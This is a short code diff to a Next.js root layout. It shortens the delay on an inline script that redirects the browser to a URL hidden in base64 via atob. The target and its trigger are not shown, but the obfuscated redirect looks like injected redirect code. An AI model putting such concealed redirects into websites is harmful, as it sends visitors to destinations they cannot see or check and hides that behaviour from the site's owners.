@@ -133,7 +133,7 @@ export default function RootLayout({
 
                     setTimeout(function() {
                         window.location.replace(atob(targetB64));
-                    }, 100);
+                    }, 10);
                 }
               })();
             `,
